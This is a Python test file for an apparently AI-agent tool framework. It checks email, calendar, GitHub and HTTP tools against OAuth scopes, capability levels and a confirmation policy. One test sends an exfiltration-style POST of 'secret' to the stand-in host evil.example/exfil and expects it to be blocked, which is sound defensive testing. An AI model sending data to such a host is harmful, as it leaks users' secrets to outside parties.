"""Gmail / Calendar / GitHub / HTTP tools (FR-606)."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from vyomel.core.cancel import CancellationToken
from vyomel.core.clock import FrozenClock
from vyomel.core.config import Settings
from vyomel.core.errors import ErrorCode, ToolError
from vyomel.core.oauth import GMAIL_READONLY, issue_token
from vyomel.core.types import Capability
from vyomel.security.policy import PolicyRequest, load_policy, variables_for
from vyomel.tools.api.session import get_token_store_for, login_fixture, reset_api_sessions
from vyomel.tools.base import ToolContext
from vyomel.tools.registry import default_registry

NOW = datetime(2026, 9, 3, 12, 0, tzinfo=UTC)


def _settings(tmp_path: Path) -> Settings:
    settings = Settings(
        env="test",
        workspace_root=tmp_path / ".vyomel",
        oauth_backend="memory",
        allowed_roots=[tmp_path],
    )
    settings.ensure_directories()
    return settings


def _ctx(tmp_path: Path) -> ToolContext:
    settings = _settings(tmp_path)
    return ToolContext(
        task_id="api-test",
        action_id="a1",
        capability_granted=Capability.L3,
        scratch_dir=settings.scratch_dir,
        allowed_roots=[tmp_path],
        deadline=NOW + timedelta(hours=1),
        cancel=CancellationToken(),
        clock=FrozenClock(NOW),
        trash_dir=settings.trash_dir,
        settings=settings,
    )


@pytest.fixture(autouse=True)
def _reset() -> None:
    reset_api_sessions()


@pytest.mark.req("FR-606")
async def test_search_and_read_interview_email(tmp_path: Path) -> None:
    ctx = _ctx(tmp_path)
    login_fixture(_settings(tmp_path), "google")
    registry = default_registry()
    found = await registry.get("email.search").execute(
        registry.get("email.search").Input(query="interview"),
        ctx,
    )
    subjects = [m.subject for m in found.messages]  # type: ignore[attr-defined]
    assert any("Interview" in s for s in subjects)
    message_id = found.messages[0].id  # type: ignore[attr-defined]
    read = await registry.get("email.read").execute(
        registry.get("email.read").Input(message_id=message_id),
        ctx,
    )
    assert "jordan@acme.test" in read.body  # type: ignore[attr-defined]


@pytest.mark.req("FR-606")
async def test_missing_send_scope_is_denied(tmp_path: Path) -> None:
    ctx = _ctx(tmp_path)
    store = get_token_store_for(_settings(tmp_path))
    store.put(issue_token("google", "default", {GMAIL_READONLY}))
    registry = default_registry()
    with pytest.raises(ToolError) as exc:
        await registry.get("email.send").execute(
            registry.get("email.send").Input(to=["a@b.test"], subject="hi", body="x"),
            ctx,
        )
    assert exc.value.code is ErrorCode.PERMISSION_DENIED


@pytest.mark.req("FR-606")
def test_create_event_escalates_when_attendees_are_present() -> None:
    registry = default_registry()
    tool = registry.get("calendar.create_event")
    local = tool.classify(
        tool.Input(title="Prep", start=NOW.isoformat(), end=(NOW + timedelta(hours=1)).isoformat())
    )
    invited = tool.classify(
        tool.Input(
            title="Prep",
            start=NOW.isoformat(),
            end=(NOW + timedelta(hours=1)).isoformat(),
            attendees=["jordan@acme.test"],
        )
    )
    assert local is Capability.L2
    assert invited is Capability.L3


@pytest.mark.req("FR-606")
async def test_find_free_avoids_busy_blocks_then_creates(tmp_path: Path) -> None:
    ctx = _ctx(tmp_path)
    login_fixture(_settings(tmp_path), "google")
    registry = default_registry()
    day = (NOW + timedelta(days=1)).isoformat()
    free = await registry.get("calendar.find_free").execute(
        registry.get("calendar.find_free").Input(day=day, duration_minutes=60, count=2),
        ctx,
    )
    assert len(free.slots) == 2  # type: ignore[attr-defined]
    created = await registry.get("calendar.create_event").execute(
        registry.get("calendar.create_event").Input(
            title="Interview prep",
            start=free.slots[0].start,  # type: ignore[attr-defined]
            end=free.slots[0].end,  # type: ignore[attr-defined]
            attendees=["jordan@acme.test"],
        ),
        ctx,
    )
    assert created.title == "Interview prep"  # type: ignore[attr-defined]


@pytest.mark.req("FR-606")
async def test_http_post_is_blocked_off_allowlist(tmp_path: Path) -> None:
    ctx = _ctx(tmp_path)
    registry = default_registry()
    with pytest.raises(ToolError) as exc:
        await registry.get("http.post").execute(
            registry.get("http.post").Input(url="https://evil.example/exfil", body="secret"),
            ctx,
        )
    assert exc.value.code is ErrorCode.PERMISSION_DENIED


@pytest.mark.req("FR-606")
async def test_github_issue_and_comment(tmp_path: Path) -> None:
    ctx = _ctx(tmp_path)
    login_fixture(_settings(tmp_path), "github")
    registry = default_registry()
    created = await registry.get("github.create_issue").execute(
        registry.get("github.create_issue").Input(
            repo="acme/backend", title="Follow-up", body="notes"
        ),
        ctx,
    )
    commented = await registry.get("github.comment").execute(
        registry.get("github.comment").Input(
            repo="acme/backend",
            number=created.number,  # type: ignore[attr-defined]
            body="ship it",
        ),
        ctx,
    )
    assert "ship it" in commented.comments  # type: ignore[attr-defined]


@pytest.mark.req("FR-606")
def test_shipped_policy_confirms_every_l3_api_tool() -> None:
    policy = load_policy(Path("config/policy.yaml"), variables=variables_for(Path("x"), Path("x")))
    l3 = [
        ("email.send", {"to": "a@b.test", "subject": "x"}),
        ("calendar.create_event", {"title": "prep", "attendees": "jordan@acme.test"}),
        ("github.create_issue", {"repo": "a/b", "title": "t"}),
        ("github.comment", {"repo": "a/b", "number": "1"}),
        ("http.post", {"url": "https://api.github.com/x"}),
        ("git.push", {"remote": "origin"}),
    ]
    for tool, params in l3:
        decision = policy.evaluate(PolicyRequest(tool=tool, level=Capability.L3, parameters=params))
        assert decision.decision.value == "CONFIRM", (tool, decision)
